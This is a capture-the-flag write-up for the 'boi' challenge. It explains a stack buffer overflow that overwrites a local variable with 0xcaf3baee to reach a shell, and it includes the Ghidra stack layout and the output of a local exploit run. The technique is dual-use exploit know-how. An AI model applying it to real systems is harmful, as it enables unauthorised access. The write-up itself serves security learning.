# Boi Writeup

## Steps:
1. Notice an input is entered with a limit of `0x28` (`40`), which will likely be used for a buffer overflow. There is a second variable that, if equal to `0xcaf3baee` runs `run_cmd("/bin/bash")`
2. Look at the stack variable layout
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[2]:     00400659(W), 
                                                                                                   004006ca(R)  
             undefined4        Stack[-0x20]:4 local_20                                XREF[1]:     00400677(W)  
             undefined4        Stack[-0x24]:4 goal                                    XREF[2]:     0040067e(W), 
                                                                                                   004006a5(R)  
             undefined8        Stack[-0x30]:8 local_30                                XREF[1]:     00400667(W)  
             undefined8        Stack[-0x38]:8 input                                   XREF[2]:     0040065f(W), 
                                                                                                   0040068f(*)  
             undefined4        Stack[-0x3c]:4 local_3c                                XREF[1]:     00400649(W)  
             undefined8        Stack[-0x48]:8 local_48                                XREF[1]:     0040064c(W)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:0040054d(*), 004007b4, 
                                                                                          00400868(*)  
```
input is at `Stack[-0x38]` and the variable we want to change (renamed 'goal') is at `Stack[-0x24]`.
`0x38 - 0x24 = 0x14' which is 20 bytes in decimal. Since we can write 40 bytes, we can access and change 'goal'
3. Create a payload overwriting the 20 bytes from 'input' to 'goal' and set `goal = 0xcaf3baee`
4. Send payload to process


## Solution:
```
$ python3 ex_boi.py  
[+] Starting local process './boi': pid 37830
[*] Switching to interactive mode
Are you a big boiiiii??
$ w
 10:44:17 up  1:09,  2 users,  load average: 0.20, 0.61, 0.66
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
kali              -                09:33    1:11m  0.00s  0.03s lightdm --session-child 13 24
kali              -                09:33    1:11m  0.00s  0.53s /usr/lib/systemd/systemd --user
$ ls
boi  ex_boi.py
$ 
$ exit
[*] Got EOF while reading in interactive
$ 
[*] Process './boi' stopped with exit code 0 (pid 37830)
[*] Got EOF while sending in interactive
```
